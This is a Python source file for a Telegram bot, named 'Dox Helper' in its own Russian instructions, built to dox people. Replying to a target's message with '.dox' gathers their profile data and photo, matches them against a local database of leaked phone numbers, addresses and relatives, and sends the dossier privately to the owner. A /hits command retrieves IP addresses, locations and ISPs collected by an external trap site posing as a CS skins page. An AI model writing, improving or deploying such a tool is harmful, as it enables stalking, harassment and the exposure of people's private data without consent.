import os, sqlite3, asyncio, requests, threading
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from flask import Flask

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID  = int(os.getenv("OWNER_ID", "0"))
TRAP_URL  = os.getenv("TRAP_URL", "https://skin-cs.onrender.com")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp  = Dispatcher()

DB = sqlite3.connect("leaks.db", check_same_thread=False)
DB.execute("""CREATE TABLE IF NOT EXISTS people(
    phone TEXT, fio TEXT, address TEXT, relatives TEXT, source TEXT)""")
DB.commit()

CONTACTS = {}

async def tg_data(uid):
    d = {"id": uid, "username": "—", "name": "—", "bio": "—", "photo": "—"}
    try:
        chat = await bot.get_chat(uid)
        d["username"] = chat.username or "—"
        d["name"]     = chat.full_name or "—"
        d["bio"]      = getattr(chat, "bio", None) or "—"
        ph = await bot.get_user_profile_photos(uid, limit=1)
        if ph.total_count:
            f = await bot.get_file(ph.photos[0][-1].file_id)
            d["photo"] = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{f.file_path}"
    except Exception as e:
        d["error"] = str(e)
    return d

def leak_data(phone, fio):
    out = {"father": "—", "mother": "—", "address": "—", "phone": "—"}
    cur = DB.cursor()
    if phone:
        cur.execute("SELECT phone,address,relatives FROM people WHERE phone=?", (phone,))
    elif fio and fio != "—":
        cur.execute("SELECT phone,address,relatives FROM people WHERE fio LIKE ?", (f"%{fio}%",))
    else:
        return out
    r = cur.fetchone()
    if r:
        out["phone"]   = r[0] or "—"
        out["address"] = r[1] or "—"
        rel = r[2] or ""
        for p in rel.split(";"):
            if "отец" in p.lower(): out["father"] = p.strip()
            if "мать" in p.lower(): out["mother"] = p.strip()
    return out

def menu(tg, lk):
    return (
        "<b>▸ DOX</b>\n"
        f"├ ID: <code>{tg['id']}</code>\n"
        f"├ username: @{tg['username']}\n"
        f"├ name: {tg['name']}\n"
        f"├ father: {lk['father']}\n"
        f"├ mother: {lk['mother']}\n"
        f"├ phone: <code>{lk['phone']}</code>\n"
        f"├ address: {lk['address']}\n"
        f"└ photo: {tg['photo']}"
    )

@dp.message(Command("start"))
async def start(m: Message):
    if m.from_user.id != OWNER_ID:
        await m.answer("—")
        return
    await m.answer(
        "👋 <b>Dox Helper</b>\n\n"
        "Как юзать:\n"
        "1. Добавь меня в чат с целью\n"
        "2. Свайпни влево по её сообщению (Reply)\n"
        "3. Напиши <code>.dox</code>"
    )

@dp.message(F.text.startswith(".dox"))
async def dox_cmd(m: Message):
    if m.from_user.id != OWNER_ID:
        return
    target = m.reply_to_message.from_user if m.reply_to_message else m.from_user
    uid = target.id
    tg = await tg_data(uid)
    lk = leak_data(CONTACTS.get(uid), tg.get("name"))
    try:
        await m.delete()
    except Exception:
        pass
    try:
        await bot.send_message(OWNER_ID, menu(tg, lk), disable_web_page_preview=True)
    except Exception:
        await m.answer("Напиши боту в личку /start")

@dp.message(Command("hits"))
async def hits_cmd(m: Message):
    if m.from_user.id != OWNER_ID:
        return
    try:
        r = requests.get(f"{TRAP_URL}/hits", timeout=15).json()
    except Exception as e:
        await m.answer(f"Ловушка не отвечает: {e}")
        return
    if not r:
        await m.answer("Хитов пока нет.")
        return
    lines = ["<b>▸ HITS</b> (последние 10)"]
    for h in r[-10:]:
        lines.append(
            f"\n<b>{h.get('ts','')[:19]}</b>\n"
            f"метка: <code>{h.get('uid','')}</code>\n"
            f"IP: <code>{h.get('ip','')}</code>\n"
            f"город: {h.get('city','')}, {h.get('region','')}\n"
            f"страна: {h.get('country','')}\n"
            f"провайдер: {h.get('isp','')}"
        )
    await m.answer("\n".join(lines))

@dp.message(F.contact)
async def on_contact(m: Message):
    if m.contact and m.contact.user_id:
        CONTACTS[m.contact.user_id] = m.contact.phone_number

# ---- заглушка для Render Web Service ----
web = Flask(__name__)

@web.route("/")
def home():
    return "OK", 200

def run_web():
    port = int(os.getenv("PORT", 10000))
    web.run(host="0.0.0.0", port=port)

async def main():
    threading.Thread(target=run_web, daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
